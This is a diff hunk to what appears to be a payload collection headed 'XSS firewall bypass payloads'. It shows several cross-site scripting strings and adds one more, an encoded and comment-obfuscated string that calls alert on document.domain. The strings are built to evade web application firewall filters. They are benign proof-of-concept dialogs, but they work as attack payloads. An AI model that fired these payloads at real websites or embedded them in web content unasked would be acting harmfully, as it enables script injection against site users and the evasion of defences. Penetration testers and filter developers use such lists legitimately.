@@ -13,3 +13,4 @@ XSS FIREWALL BYPASS PAYLOADS :
 "-eval("window['pro'%2B'mpt'](8)")-"
 "onclick=prompt(8)>"@x.y
 <Svg Only=1 OnLoad=confirm(1)>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
